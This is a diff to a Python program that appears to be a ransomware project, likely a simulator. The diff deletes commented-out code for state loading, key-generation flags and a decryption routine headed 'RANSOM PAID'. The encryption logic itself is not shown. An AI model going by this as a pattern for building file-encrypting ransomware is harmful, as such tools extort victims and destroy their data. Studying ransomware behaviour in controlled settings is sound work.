@@ -50,27 +50,6 @@ def scan_data_folder_for_encryption():
 #                STATE MANAGEMENT
 # ----------------------------------------------------
 
-# def load_state():
-#     # Load previous state if exists
-#     if os.path.exists(STATE_FILE):
-#         with open(STATE_FILE, "r") as f:
-#             state = json.load(f)
-#     else:
-#         state = {"keys_generated": False, "files_encrypted": False}
-
-#     # Scan Data/ folder for encryption status
-#     real_state = scan_data_folder_for_encryption()
-#     private_key = decryptor.load_rsa_private_key()
-#     if private_key is None:
-#         state["keys_generated"] = False
-#     # Convert to boolean for legacy compatibility
-#     state["files_encrypted"] = (real_state == "full")
-
-#     state["file_state"] = real_state  # NEW FIELD
-
-#     save_state(state)
-
-#     return state
 
 def load_state():
     # Base state
@@ -159,9 +138,6 @@ def generate_keys(state):
         pri_dir, pub_dir = asymmetric.prepare_folders()
         asymmetric.save_keys(private_key, public_key, pri_dir, pub_dir)
         print("\n[✓] RSA Key Pair Generated Successfully.")
-        # private_key = decryptor.load_rsa_private_key()
-        # if private_key is None:
-        #     state["keys_generated"] = True
           
         state["keys_generated"] = True
         save_state(state)
@@ -215,32 +191,6 @@ def start_encryption(state):
 # ----------------------------------------------------
 #                DECRYPTION PROCESS
 # ----------------------------------------------------
-# def start_decryption(state):
-#     file_state = state.get("file_state", "none")
-#     # if not state["files_encrypted"]:
-#     if not file_state == "mixed":
-#         print("[X] ERROR: No encrypted files detected.")
-#         return
-
-#     print("\n====================================================")
-#     print("       🔓 DECRYPTION UNLOCKED — RANSOM PAID 🔓")
-#     print("====================================================\n")
-
-#     try:
-#         private_key = decryptor.load_rsa_private_key()
-#         if private_key is None:
-#             print("[X] ERROR: Private key missing — cannot decrypt!")
-#             return
-
-#         decryptor.decrypt_all_files(private_key)
-
-#         state["files_encrypted"] = False
-#         save_state(state)
-
-#         print("\n[✓] Files successfully decrypted.")
-
-#     except Exception as e:
-#         print(f"[ERROR] Decryption failed: {e}")
 
 def start_decryption(state):
     file_state = state.get("file_state", "none")
